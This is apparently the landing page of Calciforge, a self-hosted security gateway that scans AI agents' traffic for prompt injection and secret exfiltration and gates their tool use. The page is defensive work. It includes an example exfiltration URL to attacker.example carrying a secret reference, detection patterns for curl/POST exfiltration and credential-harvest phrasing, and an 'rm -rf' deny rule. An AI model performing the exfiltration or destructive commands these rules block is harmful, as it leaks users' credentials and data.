---
layout: default
title: Calciforge
---

<style>
:root {
  --calci-fire: #d97706;
  --calci-fire-bright: #f59e0b;
  --calci-stone: #44403c;
  --calci-stone-soft: #78716c;
  --calci-paper: #fafaf9;
  --calci-ink: #1c1917;
  --calci-line: #e7e5e4;
  --calci-code-bg: #f5f5f4;
  --calci-code-dark: #1c1917;
}
html { box-sizing: border-box; }
*, *:before, *:after { box-sizing: inherit; }
body {
  background: var(--calci-paper);
  color: var(--calci-ink);
  font-family: ui-sans-serif, system-ui, -apple-system, sans-serif;
  line-height: 1.6;
  margin: 0;
  max-width: none;
  min-height: 100vh;
  padding: 0;
}
.container { max-width: 760px; margin: 2.5rem auto; padding: 0 1.2rem 4rem; }
.hero {
  min-height: min(720px, 78vh);
  display: grid;
  align-items: end;
  background-image: url("assets/calciforge-hero.jpg");
  background-size: cover;
  background-position: center right;
  color: #1c1917;
  position: relative;
}
.hero::before {
  content: "";
  position: absolute;
  inset: 0;
  background: linear-gradient(
    90deg,
    rgba(250, 250, 249, 0.94) 0%,
    rgba(250, 250, 249, 0.86) 31%,
    rgba(250, 250, 249, 0.36) 54%,
    rgba(250, 250, 249, 0.02) 76%
  );
}
.hero-inner {
  width: min(1160px, calc(100% - 2.4rem));
  margin: 0 auto;
  padding: 5rem 0 4.5rem;
  position: relative;
  z-index: 1;
}
.hero-copy {
  max-width: 40rem;
}
.wordmark {
  font-size: clamp(3.2rem, 11vw, 7rem);
  font-weight: 700;
  letter-spacing: 0;
  margin: 0;
  color: #1c1917;
  line-height: 1;
  text-shadow: 0 2px 20px rgba(250, 250, 249, 0.65);
}
.wordmark .glow {
  background: linear-gradient(180deg, var(--calci-fire-bright), var(--calci-fire));
  background-clip: text;
  -webkit-background-clip: text;
  color: transparent;
}
.tagline {
  font-style: italic;
  font-size: clamp(1.15rem, 3vw, 1.7rem);
  color: #7c2d12;
  margin: 0.3rem 0 1.5rem;
  text-shadow: 0 1px 14px rgba(250, 250, 249, 0.75);
}
.lede {
  font-size: 1.05rem;
  color: var(--calci-ink);
  margin-bottom: 1.5rem;
  max-width: 42rem;
  text-shadow: 0 1px 14px rgba(250, 250, 249, 0.72);
}
h2 {
  font-size: 1.4rem;
  margin-top: 2.8rem;
  color: var(--calci-stone);
  border-bottom: 1px solid var(--calci-line);
  padding-bottom: 0.4rem;
}
h3 { font-size: 1.05rem; margin-top: 1.5rem; color: var(--calci-stone); }
a { color: var(--calci-fire); text-decoration: none; border-bottom: 1px solid transparent; }
a:hover { border-bottom-color: var(--calci-fire); }
.nav { margin: 1.2rem 0 2rem; padding: 0.6rem 0; border-top: 1px solid var(--calci-line); border-bottom: 1px solid var(--calci-line); font-size: 0.95rem; }
.nav a { margin-right: 1.4rem; font-weight: 500; }
.hero .nav {
  border-color: rgba(68, 64, 60, 0.32);
  margin-bottom: 0;
  max-width: 34rem;
}
.hero .nav a {
  color: #7c2d12;
  text-shadow: 0 1px 10px rgba(250, 250, 249, 0.7);
}
ul li { margin-bottom: 0.35rem; }
code {
  background: var(--calci-code-bg);
  padding: 0.1rem 0.35rem;
  border-radius: 3px;
  font-size: 0.92em;
  font-family: ui-monospace, "SF Mono", Menlo, monospace;
}
pre {
  background: var(--calci-code-dark);
  color: var(--calci-paper);
  padding: 1rem 1.2rem;
  border-radius: 6px;
  overflow-x: auto;
  font-size: 0.88rem;
  line-height: 1.5;
}
pre code { background: transparent; padding: 0; color: inherit; font-size: inherit; }
.muted { color: var(--calci-stone-soft); }
hr { border: 0; border-top: 1px solid var(--calci-line); margin: 2.5rem 0; }
footer {
  margin-top: 3.5rem;
  padding-top: 1.5rem;
  border-top: 1px solid var(--calci-line);
  font-size: 0.88rem;
  color: var(--calci-stone-soft);
}
footer p { margin: 0.5rem 0; }
footer .name-origin {
  background: rgba(217, 119, 6, 0.04);
  padding: 0.8rem 1rem;
  border-radius: 4px;
  border-left: 2px solid rgba(217, 119, 6, 0.4);
  margin: 1rem 0;
}
@media (max-width: 760px) {
  .hero {
    min-height: 680px;
    background-position: 62% center;
  }
  .hero::before {
    background: linear-gradient(
      180deg,
      rgba(250, 250, 249, 0.88) 0%,
      rgba(250, 250, 249, 0.76) 42%,
      rgba(250, 250, 249, 0.92) 100%
    );
  }
  .hero-inner {
    padding: 3.5rem 0 3rem;
  }
}
</style>

<header class="hero" aria-label="A warm hand-painted fantasy castle workshop on a dawn hillside">
<div class="hero-inner">
<div class="hero-copy">

<h1 class="wordmark">Calci<span class="glow">forge</span></h1>
<p class="tagline">Keep your castle secure and moving.</p>

<p class="lede">A self-hosted security gateway for AI agents. Every agent
gets a bound contract — destination-scoped secret substitution,
model routes, command permissions, and audit trails — without sharing
raw API keys or trusting the agent's own restraint.</p>

<div class="nav">
<a href="https://github.com/bglusman/calciforge">GitHub</a>
<a href="#quick-install-mac">Install</a>
<a href="agents.md">Agents</a>
</div>

</div>
</div>
</header>

<main class="container" markdown="1">

## What it gives you

Calciforge sits between your AI agents and the rest of the world. The
gateway covers seven overlapping concerns; you can adopt any subset.

### Security gateway

The core product is the security gateway: a local network enforcement
point that agents use through explicit fetch/tool integration and, for
plaintext HTTP, `HTTP_PROXY`. Instead of
hoping each agent remembers the right rules, Calciforge puts the rules
at the request boundary where secrets, destinations, model routes, and
tool permissions can be checked before traffic leaves the machine.

Ambient `HTTPS_PROXY` is deliberately not presented as full protection:
standard HTTPS proxying uses CONNECT tunnels, so encrypted request bodies
cannot be inspected or rewritten without a separate MITM design.

The gateway protects in three places:

- **Before outbound requests** — substitute `{% raw %}{{secret:NAME}}{% endraw %}`
  only at approved destinations, scan request bodies for exfiltration
  language, and fail closed when a referenced secret cannot be resolved.
- **Before inbound content reaches the model** — scan fetched pages,
  search results, email bodies, command output, and other tool results
  for prompt-injection and hidden-instruction patterns.
- **Before tools execute** — ask the `clashd` policy sidecar whether a
  command, file write, network call, or other agent action should be
  allowed, denied, or sent for review.

The default adversary detector is intentionally editable. Calciforge
ships a built-in Starlark policy for deterministic checks such as
zero-width text, hidden DOM, base64-encoded English instructions,
credential-harvest phrasing, exfiltration language, and concrete
tool-policy bypass patterns. Operators can copy that policy into
`/etc/calciforge/scanner-policies/default-scanner.star`, edit it, add
more Starlark checks, or attach a remote HTTP scanner for heavier DLP
and LLM-based semantic review.

```toml
[[security.scanner_checks]]
kind = "starlark"
path = "/etc/calciforge/scanner-policies/default-scanner.star"
fail_closed = true
max_callstack = 64

[[security.scanner_checks]]
kind = "remote_http"
url = "http://127.0.0.1:9801"
fail_closed = true
```

Starlark policy files can call `regex_match(pattern, content)` and
`base64_decoded_regex_match(pattern, content)` for bounded Rust-backed
matching. Remote scanners use a simple `/scan` HTTP contract; the
included example wraps an OpenAI-compatible classifier with an editable
prompt for foreign-language, poetry/style-shift, fictional-framing, and
multi-step manipulation cases that are too semantic for local regexes.

See the [security gateway docs](security-gateway.md) for configuration
details and the
[red-team fixtures](https://github.com/bglusman/calciforge/tree/main/examples/red-team)
for the contributor-friendly suite used to harden detection over time.

### Secret management

Your agent never holds the actual API key. The gateway resolves
through the configured local secret backend and substitutes at the
request boundary. In the default deployment that backend is
[fnox](https://github.com/jdx/fnox); Calciforge and the `fnox` CLI can
share the same `fnox.toml` and profile, so manual `fnox set/list/tui`
operations manage the same store.

```toml
# fnox.toml — the secret store the gateway resolves through
[secrets]
OPENAI_API_KEY = { encrypted = "age-encryption.org/v1..." }
ANTHROPIC_API_KEY = { provider = "1password", key = "claude" }
NPM_TOKEN = { default = "value-from-env-or-prompt" }
```

For new values, prefer the local paste UI. It gives you a short-lived
browser form and keeps the value out of Telegram, Matrix, WhatsApp,
and other chat history:

```bash
paste-server OPENAI_API_KEY "OpenAI API key"
# prints http://127.0.0.1:PORT/paste/<token>

paste-server --bulk env-import "bulk .env import"
# prints http://127.0.0.1:PORT/bulk/<token>
```

The URLs expire after five minutes and are single-use. The bulk URL
accepts a whole `.env`-shaped paste and returns per-key results
(stored / already-exists / illegal-name / malformed).

The paste server binds to localhost by default. Remote/phone use should
go through an explicit short-lived authenticated tunnel or proxy; do
not expose the paste server directly to the open internet.

### Outbound traffic gating

The gateway substitutes `{% raw %}{{secret:NAME}}{% endraw %}`
references at the moment of forwarding — and only if the destination
is on the per-secret allowlist.

```toml
# /etc/calciforge/security-proxy.toml
[secret_destination_allowlist]
OPENAI_API_KEY = ["api.openai.com", "*.openai.com"]
ANTHROPIC_API_KEY = ["api.anthropic.com"]
GITHUB_TOKEN = ["api.github.com", "uploads.github.com"]
```

Without an allowlist entry: substitution is allowed everywhere
(opt-in tightening). With an entry: anything else returns 403 before
the resolver is even consulted, so a prompt-injected agent calling
`https://attacker.example/?key={% raw %}{{secret:OPENAI_API_KEY}}{% endraw %}`
fails before the secret value is loaded into memory.

Outbound bodies are also scanned for *exfiltration-attempt* patterns
(`POST to https://…`, `send to https://…`, `curl … https://…`,
`beacon to`, etc.) and PII-harvest phrasing (`send me your password`,
`what is your api key`). Generic high-entropy secret-shape detection
(JWT-shaped strings, `sk-*` keys, etc.) was deliberately removed
during the channel-integration cut and is on the
[roadmap](roadmap/outbound-sensitive-data-detection.md).

The scanner pipeline is configurable. The default policy now runs through
`builtin:calciforge/default-scanner.star`, so the rule set can be copied,
edited, replaced, or ordered alongside other Starlark checks. Starlark
policies can call `regex_match(pattern, content)` and bounded
`base64_decoded_regex_match(pattern, content)` helpers for Rust-backed matching
without a sidecar service. Optional remote HTTP scanners can host heavier DLP
or LLM classifier passes, and the example LLM classifier ships with an editable
default prompt. The built-in default measured about `299µs` per warm scan in a
local release build; remote LLM checks are explicit because they add materially
more latency.

### Inbound traffic gating and tool policy

Every upstream response is scanned for prompt-injection payloads
before being returned to the agent. Configurable verdicts (Block /
Review / Allow) routed via the policy plane.

For tool calls, Calciforge adapts the
[clash](https://crates.io/crates/clash) policy engine through a small
HTTP daemon shipped in this repo as
[`clashd`](https://github.com/bglusman/calciforge/tree/main/crates/clashd).
The daemon is not the product; it is the policy sidecar that lets
agent runtimes ask "allow, deny, or review?" before a tool executes.

```python
# clash-policy.star — Starlark policy served by clashd
def evaluate(ctx):
    if ctx.tool == "Bash" and "rm -rf" in ctx.args.get("command", ""):
        return Verdict.deny("destructive command requires manual approval")
    if ctx.identity != "owner" and ctx.tool == "Write":
        return Verdict.review("non-owner write — flag for review")
    return Verdict.allow()
```

### Model gateway

Calciforge can expose an OpenAI-compatible local endpoint while routing
requests to named providers, explicit model routes, local models, and
synthetic models. Chat users can also inspect and switch configured
aliases with `!model`.

The synthetic-model vocabulary is:

- **Alloy** — blend among interchangeable models by weighted or
  round-robin selection. Implemented today with context-window
  validation: every constituent declares a context window, and the
  alloy can only advertise a ceiling every constituent can satisfy.
- **Cascade** — ordered fallback on provider failure. The behavior
  exists inside alloy execution and as named `[[cascades]]`.
- **Dispatcher** — choose by request shape, such as "smallest
  sufficient model." This is the size-routing primitive for mixing
  small local models with larger remote models.
- **Exec model** — expose a local binary or wrapper script as a model
  gateway model, typically for subscription-backed CLIs where the CLI
  owns OAuth/session state.

Synthetic models may compose other synthetic models as a DAG. Calciforge
flattens the selected plan at request time and rejects cycles during
initialization.

```toml
# /etc/calciforge/config.toml — model gateway

[proxy]
enabled = true
bind = "127.0.0.1:8080"
backend_type = "http"
backend_url = "https://api.openai.com/v1"
backend_api_key_file = "/etc/calciforge/secrets/openai-key"

[proxy.token_estimator]
strategy = "auto"
# tokenizer = "o200k_base" # force a tiktoken base for non-OpenAI model IDs
safety_margin = 1.10

# Pattern-based provider routing — first match wins after model_routes.
[[proxy.providers]]
id = "anthropic"
url = "https://api.anthropic.com/v1"
api_key_file = "/etc/calciforge/secrets/anthropic-key"
models = ["claude-*", "anthropic/*"]
timeout_seconds = 120

[[proxy.providers]]
id = "local-mlx"
url = "http://127.0.0.1:8888/v1"
models = ["local/*", "qwen/*", "mlx/*"]

# Explicit routes take precedence over provider pattern lists.
[[proxy.model_routes]]
pattern = "coding/default"
provider = "anthropic"

# Chat aliases shown by `!model`; `!model sonnet` prints the expansion.
[[model_shortcuts]]
alias = "sonnet"
model = "anthropic/claude-sonnet-4.6"

[[model_shortcuts]]
alias = "local"
model = "local/qwen3-35b"

# Alloys pick among equivalent models by weighted or round-robin strategy.
[[alloys]]
id = "balanced"
name = "Balanced remote blend"
strategy = "weighted"

[[alloys.constituents]]
model = "anthropic/claude-sonnet-4.6"
weight = 70
context_window = 200000

[[alloys.constituents]]
model = "openrouter/google/gemini-flash-1.5"
weight = 30
context_window = 100000

[local_models]
enabled = true
current = "qwen3-35b"

[local_models.mlx_lm]
host = "127.0.0.1"
port = 8888

[[local_models.models]]
id = "qwen3-35b"
hf_id = "mlx-community/Qwen2.5-35B-Instruct-8bit"
display_name = "Qwen 35B local"

[[exec_models]]
id = "codex/gpt-5.5"
name = "Codex GPT-5.5 subscription"
context_window = 262144
command = "/etc/calciforge/exec-models/codex-exec.sh"
args = ["-"]

[[dispatchers]]
id = "smart-local"
name = "Use local until the prompt outgrows it"

[[dispatchers.models]]
model = "local/qwen3-35b"
context_window = 32768

[[dispatchers.models]]
model = "anthropic/claude-sonnet-4.6"
context_window = 200000

[[dispatchers.models]]
model = "codex/gpt-5.5"
context_window = 262144
```

The full gateway reference is
[`docs/model-gateway.md`](model-gateway.md).
Named cascades, dispatchers, and token-window fit checks are captured
in
[`docs/rfcs/model-gateway-primitives.md`](rfcs/model-gateway-primitives.md).

### Subscription-backed agents and models

Calciforge can call local CLIs such as Codex, Claude Code, OpenClaw,
and other scriptable agents in two different ways. Use a direct agent
adapter when the CLI should keep its own agent identity and workflow;
use an `[[exec_models]]` entry when the CLI should appear as a model
behind the OpenAI-compatible gateway.

That distinction matters for subscriptions and OAuth. The vendor CLI
can own its local browser login, refresh tokens, project state, and
provider-specific flags while Calciforge only sees a configured command,
stdin prompt, stdout answer, timeout, and context-window declaration.
The example wrappers are intentionally small because provider CLIs and
terms change; operators should validate the installed CLI version and
subscription terms before making an exec model part of their default
route.

Read the [agent adapter notes](agent-adapters.md) and
[Codex/OpenClaw integration guide](codex-openclaw-integration.md) for
direct `codex-cli`, `openclaw-channel`, `cli`, `acpx`, and exec-model
examples.

### Secured recipes and orchestrators

Calciforge can also wrap tools that are not stable enough, or not shaped
correctly, for first-class adapter support. The working vocabulary is:

- **Recipes** — documented, security-aware command configurations for
  local tools such as npcsh, opencode profiles, or one-off media agents.
  Recipes can still use Calciforge identity checks, per-agent proxy
  environment, timeouts, stdin prompt delivery, stderr redaction, audit
  logs, and controlled artifact directories.
- **Adapters** — first-class protocol integrations used when Calciforge
  must understand upstream-specific behavior, such as event streams,
  final-answer parsing, approval pauses, callbacks, or native session
  state.
- **Orchestrators** — planned async work backends where Calciforge submits
  work, monitors status, relays progress, and delivers final summaries or
  artifacts instead of pretending every request is a synchronous chat
  completion.

This is the path for a more "batteries included" agent ecosystem without
making every upstream CLI a permanent support burden. Operators can start
with a recipe, then promote it to a named adapter only if the upstream
protocol proves stable and the extra code buys safety or usability.

The first working piece is `kind = "artifact-cli"` for tools that produce
files: images from npcsh-style multimodal workflows, screenshots from
orchestrators, test reports, logs, PDFs, or generated patch summaries.
Calciforge creates a per-run artifact directory, writes the user task on
stdin, exposes the directory as `{artifact_dir}` and
`CALCIFORGE_ARTIFACT_DIR`, validates produced files, and sends a text
fallback through existing channels. Telegram and Matrix already use the
new internal outbound-message envelope; the text fallback names attachments
without exposing local filesystem paths, and native media upload can be added
channel by channel.

```toml
[[agents]]
id = "npcsh-image"
kind = "artifact-cli"
command = "/usr/local/bin/npcsh-vixynt-stdin"
args = ["{artifact_dir}/image.png"]
timeout_ms = 180000
env = { HTTP_PROXY = "http://127.0.0.1:8888", NO_PROXY = "localhost,127.0.0.1,::1" }
```

The command above is a recipe shape, not a promise that every npcsh
subcommand has stable flags. The Calciforge contract is the secured
stdin/artifact wrapper and channel delivery path. If an upstream tool
only accepts prompts in argv, use a small local wrapper and document the
weaker process-listing tradeoff.

The broader plan for async orchestrators, native media delivery, and richer
agent outputs is tracked in the
[agent recipes and orchestrators roadmap](roadmap/agent-recipes-orchestrators.md).

### Agent-facing tools (MCP and CLI)

A built-in MCP server and small CLI expose secret *names* to agents
but never return values — the only way for an agent to use a secret is to
emit `{% raw %}{{secret:NAME}}{% endraw %}` and let the gateway resolve
on the way out. Designed so a compromised agent can enumerate names
and fail to retrieve values.

Today, discovery is process-scoped: it sees the fnox names available
to the MCP server or CLI process. Calciforge enforces per-secret
destination allowlists at substitution time, but does not yet enforce
per-agent secret discovery/use ACLs. That policy layer is on the
[roadmap](roadmap/agent-secret-access-policy.md).

```json
// ~/.claude/mcp-config.json
{
  "mcpServers": {
    "calciforge-secrets": {
      "command": "/usr/local/bin/mcp-server",
      "transport": "stdio"
    }
  }
}
```

```bash
calciforge-secrets list
calciforge-secrets ref BRAVE_API_KEY
```

### Multi-channel chat

Today: Telegram, Matrix, WhatsApp, Signal, and text/iMessage. Voice is a separate
proxy passthrough surface today, not a settled per-chat-channel capability; richer
voice input, push-to-talk channels, and audio artifacts remain roadmap work.

Per-channel setup guides (config reference + TOML examples tested against
the live schema in CI):

- [Telegram](channels/telegram.md) — long-poll, no open port required
- [Matrix](channels/matrix.md) — HTTP long-poll; note: no E2EE
- [Signal](channels/signal.md) — embedded `zeroclawlabs::SignalChannel` via `signal-cli-rest-api`
- [WhatsApp](channels/whatsapp.md) — embedded WhatsApp Web session
- [Text/iMessage](channels/sms.md) — Linq webhook receiver for iMessage/RCS/SMS

Agent backends, identities, and routing rules are documented in the
[Agents, Identities, and Routing](agents.md) guide.

```toml
# /etc/calciforge/config.toml — channel configuration
[[channels]]
kind = "telegram"
enabled = true
bot_token_file = "/etc/calciforge/secrets/telegram-bot-token"
allowed_users = ["7000000001", "7000000002"]

[[channels]]
kind = "matrix"
enabled = true
homeserver = "https://matrix.example.com"
access_token_file = "/etc/calciforge/secrets/matrix-access-token"
room_id = "!roomid:example.com"
allowed_users = ["@alice:example.com"]

[[channels]]
kind = "whatsapp"
enabled = true
whatsapp_session_path = "/var/lib/calciforge/whatsapp/session.db"
allowed_numbers = ["+15555550100"]

[[channels]]
kind = "sms"
enabled = true
sms_linq_api_token_file = "/etc/calciforge/secrets/linq-token"
sms_from_phone = "+15555550001"
sms_webhook_listen = "0.0.0.0:18798"
sms_webhook_path = "/webhooks/sms"
allowed_numbers = ["+15555550100"]
```

Per-identity routing: each user gets their own active agent and audit
trail. Per-agent secret ACLs are planned; current secret enforcement
is value hiding plus destination allowlists.

### Sensitive system operations

A separate authenticated daemon (`host-agent`) handles ZFS / systemd
/ PCT / git / exec calls behind mTLS. Agents never get a shell
directly; they call the daemon, which validates the operation
shape against allowlist rules and runs through narrow sudoers
wrappers. The host side relies on Unix permissions for enforcement and
writes structured audit records suitable for append-only logs and
rotation.

---

## Quick install (Mac)

```bash
git clone https://github.com/bglusman/calciforge
cd calciforge
bash scripts/install.sh
```

Three services land as launchd agents:
- `clashd` on `:9001` — a `clash`-backed policy sidecar
- `security-proxy` on `:8888` — substitution + scanning + injection
- `calciforge` — channel router (needs onboarding for an LLM provider)

After editing config or moving an agent, run:

```bash
calciforge doctor
```

The installer runs `calciforge doctor --no-network` after local service
installation when a config file exists. `doctor` validates the config,
checks referenced secret files without printing values, catches stale
active-agent/model state, warns when an agent appears to point back into
the local model gateway by accident, warns if the Calciforge daemon has
ambient proxy env, checks explicit subprocess-agent proxy env,
warns about externally managed agent daemons whose proxy environment is
unverified, validates configured scanner policy files and rule syntax,
and can probe configured endpoints.
Use `calciforge doctor --no-network` when you want a local-only check.

Calciforge-managed subprocess agents should get proxy environment from their
agent config or installer-generated config. Do not put proxy variables in
`~/.zshrc` for the Calciforge daemon itself; that can route Calciforge's own
provider and control-plane traffic through its security proxy.

For externally managed agent daemons that Calciforge does not launch, set
plain HTTP proxying on the agent process or its service manager and validate
it against `security-proxy` logs:

```bash
# External agent process environment
export HTTP_PROXY=http://127.0.0.1:8888
export NO_PROXY=localhost,127.0.0.1,::1
```

---

## Status

Solo-operator usable and actively hardening, multi-user team mode in
progress. Mac-tested, Linux-ready (CI runs Ubuntu, daily-use includes
macOS and a headless Linux service host). Treat new deployments as
operator-reviewed until their channel credentials, fnox store, model
gateway providers, and synthetic model routes pass smoke tests.

The status summary above is the site-facing snapshot of what works today and
what is still in flight. Public roadmap ideas live in
the [roadmap notes](roadmap/v3-ideas.md).

<footer>
<div class="name-origin">
<strong>About the name.</strong> Calciforge is roughly "Calcifer's forge".
Calcifer is the fire demon from Diana Wynne Jones's
<em>Howl's Moving Castle</em> who's bound by contract to power the castle's
magical front door — one door connecting to many places, with strict
rules about who can pass and where. The metaphor felt apt; the tool
itself doesn't require any familiarity with the book or its film
adaptation, and nothing else from either is referenced or used.
</div>
<p>MIT-licensed. Some bundled tools (e.g. fnox) carry their own licenses.</p>
</footer>
</main>
